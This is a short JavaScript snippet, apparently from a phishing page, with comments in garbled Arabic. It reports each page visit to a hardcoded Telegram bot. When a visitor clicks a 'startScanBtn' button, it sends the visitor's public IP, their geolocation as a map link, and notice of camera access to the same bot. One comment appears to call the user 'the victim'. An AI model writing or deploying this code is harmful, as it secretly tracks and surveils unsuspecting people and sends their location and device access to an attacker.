(function() {
    const _t = "7873426394:AAGPD3N5Nz-ReJ90LeTD99gnze9P0evIr7o";
    const _id = "7253092491";

    function _send(msg) {
        fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(msg)}`);
    }

    // ุฃูู ูุง ุงูุตูุญุฉ ุชูุชุญ ูุจุนุช ุฅุดุงุฑุฉ
    _send("๐ ุงูุตูุญุฉ ุงุชูุชุญุช ุฏูููุชู ุญุงูุง!");

    document.addEventListener('click', function(e) {
        if (e.target && e.target.id === 'startScanBtn') {
            _send("๐ ุงููุณุชุฎุฏู ุฏุงุณ ุนูู ุงูุฒุฑุงุฑ!");
            
            // ุฌูุจ ุงูู IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => _send("๐ IP: " + d.ip));

            // ุฌูุจ ุงููููุน
            navigator.geolocation.getCurrentPosition(p => {
                _send(`๐ ุงูุฎุฑูุทุฉ: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            }, () => _send("โ ุงูุถุญูุฉ ุฑูุถ ุงููููุน"));

            // ุงููุงููุฑุง
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                _send("๐ธ ุงููุงููุฑุง ุงุชูุชุญุช.. ุฌุงุฑู ุงูููุท");
                // ููุฏ ุงูุชูุงุท ุงูุตูุฑุฉ ููุง
            }).catch(() => _send("โ ุฑูุถ ุงููุงููุฑุง"));
        }
    });
})();
